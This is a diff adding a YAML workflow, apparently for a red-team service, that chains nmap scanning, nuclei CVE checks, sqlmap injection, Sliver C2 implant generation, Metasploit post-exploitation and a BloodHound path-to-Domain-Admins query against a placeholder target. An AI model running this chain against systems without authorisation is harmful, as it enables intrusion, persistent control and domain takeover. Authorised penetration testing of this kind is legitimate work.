@@ -1,0 +1,81 @@
+name: 紅隊 APT 模擬
+id: apt
+desc: 完整攻擊鏈模擬，偵察→突破→橫移→控制
+kafka_topic: redsaas-apt
+
+steps:
+  - id: nmap
+    name: Nmap 資產盤點
+    engine: docker
+    cmd: >
+      docker run --rm --network host instrumentisto/nmap
+      -sV -sC --open -T4 -p-
+      {target}
+    timeout: 300
+    kafka_event: apt.nmap.done
+
+  - id: nuclei
+    name: Nuclei 漏洞發現
+    engine: docker
+    cmd: >
+      docker run --rm --network host projectdiscovery/nuclei
+      -u {target}
+      -t cves/ -t exposures/ -t vulnerabilities/
+      -severity high,critical -jsonl
+      -o /tmp/nuclei-{job_id}.jsonl
+    timeout: 600
+    kafka_event: apt.nuclei.done
+
+  - id: sqlmap
+    name: SQLMap 漏洞利用
+    engine: docker
+    cmd: >
+      docker run --rm --network host cytopia/sqlmap
+      -u "{target}" --forms --crawl=3
+      --batch --level=3 --risk=2
+      --output-dir=/tmp/sqlmap-{job_id}
+    timeout: 600
+    kafka_event: apt.sqlmap.done
+
+  - id: sliver
+    name: Sliver C2 植入準備
+    engine: sliver
+    action: generate_implant
+    params:
+      os: linux
+      arch: amd64
+      protocol: mtls
+    kafka_event: apt.sliver.ready
+    note: 需手動確認植入目標後繼續
+
+  - id: metasploit
+    name: Metasploit 後滲透
+    engine: docker
+    cmd: >
+      docker run --rm --network host
+      metasploitframework/metasploit-framework
+      msfconsole -q -x
+      "use post/multi/recon/local_exploit_suggester; run; exit"
+    timeout: 300
+    kafka_event: apt.msf.done
+    depends_on: sliver
+
+  - id: bloodhound
+    name: BloodHound AD 路徑分析
+    engine: bloodhound
+    action: query_shortest_path
+    params:
+      query: MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@{domain}'})) RETURN p
+    kafka_event: apt.bloodhound.done
+
+  - id: defectdojo
+    name: DefectDojo 歸檔
+    engine: api
+    action: import_findings
+    kafka_event: apt.import.done
+
+  - id: report
+    name: AI 攻擊報告
+    engine: report
+    action: generate_word
+    kafka_event: apt.report.done
